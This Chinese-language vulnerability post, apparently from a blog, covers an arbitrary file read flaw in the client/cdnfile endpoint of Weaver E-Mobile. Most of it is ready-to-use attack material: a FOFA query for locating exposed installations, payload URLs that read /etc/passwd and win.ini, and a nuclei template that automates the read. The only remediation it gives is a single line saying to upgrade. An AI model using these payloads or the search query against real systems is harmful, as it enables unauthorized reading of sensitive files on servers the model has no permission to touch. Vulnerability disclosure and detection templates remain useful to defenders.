@[toc]
## 免责申明
本文章仅供学习与交流，请勿用于非法用途，均由使用者本人负责，文章作者不为此承担任何责任
## 漏洞描述
泛微E-Mobile client/cdnfile 接口存在任意文件读取漏洞，攻击者可以读取系统的敏感文件
## 搜索语法
fofa
```
app="泛微-EMobile"
```
## 漏洞复现

**windows**
payload
```
http://ip//client/cdnfile/1C/windows/win.ini?windows
```
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/1b2d8385307b4b60ae2b0800968c856d.png)
**linux**
payload
```
http://ip/client/cdnfile/C/etc/passwd?linux
```

## nuclei
```yaml
id: fanweiE-Mobile-client-cdnfile-anyfile-read

info: 
 name: 泛微E-Mobile clientcdnfile 任意文件读取漏洞
 author: xl
 description: 泛微移动管理client/cdnfile接口任意文件读取漏洞
 severity: high

requests:
  - method: GET
    path:
      - "/client/cdnfile/C/etc/passwd?linux"
      - "/client/cdnfile/1C/windows/win.ini?windows"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "root"
          - "fonts"

```

## 修复建议
升级到最新版本
